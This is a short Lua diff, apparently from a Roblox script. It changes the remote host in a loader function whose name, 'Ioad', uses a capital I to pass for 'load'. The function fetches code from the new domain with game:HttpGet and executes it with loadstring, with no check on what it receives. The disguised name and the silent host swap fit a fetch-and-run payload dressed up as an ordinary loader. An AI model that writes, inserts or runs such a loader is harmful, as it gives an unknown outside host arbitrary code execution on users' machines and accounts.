@@ -1,6 +1,6 @@
 function Ioad(name)
     local s, e = pcall(function()
-        local url = "https://loader-5xf.pages.dev/" .. name
+        local url = "https://draaxz-blox.dev/" .. name
         local response = game:HttpGet(url)
         return loadstring(response)()
     end)
